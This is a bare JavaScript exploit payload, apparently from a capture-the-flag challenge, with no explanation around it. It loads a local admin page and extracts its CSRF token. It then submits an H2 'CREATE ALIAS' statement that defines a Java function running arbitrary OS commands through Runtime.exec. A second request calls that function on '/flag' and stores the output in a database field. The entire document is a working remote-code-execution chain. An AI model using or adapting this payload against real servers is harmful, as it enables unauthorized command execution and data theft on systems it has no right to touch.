fetch('http://127.0.0.1/admin')
  .then(r => r.text())
  .then(html => {
    const csrf = html.match(/name="csrf" value="([^"]+)"/)[1];
    const create = `CREATE ALIAS IF NOT EXISTS EXEC AS $$ String exec(String cmd) throws Exception { Process p = Runtime.getRuntime().exec(cmd); byte[] b = p.getInputStream().readAllBytes(); p.waitFor(); return new String(b); } $$`;

    return fetch('http://127.0.0.1/admin/execute', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'hql=' + encodeURIComponent(create) + '&csrf=' + csrf
    });
  })
  .then(r => r.text())
  .then(html => {
    const csrf2 = html.match(/name="csrf" value="([^"]+)"/)[1];
    const run = `UPDATE ScrapeResult SET pageTitle = EXEC('/flag') WHERE id = 1`;

    return fetch('http://127.0.0.1/admin/execute', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'hql=' + encodeURIComponent(run) + '&csrf=' + csrf2
    });
  });
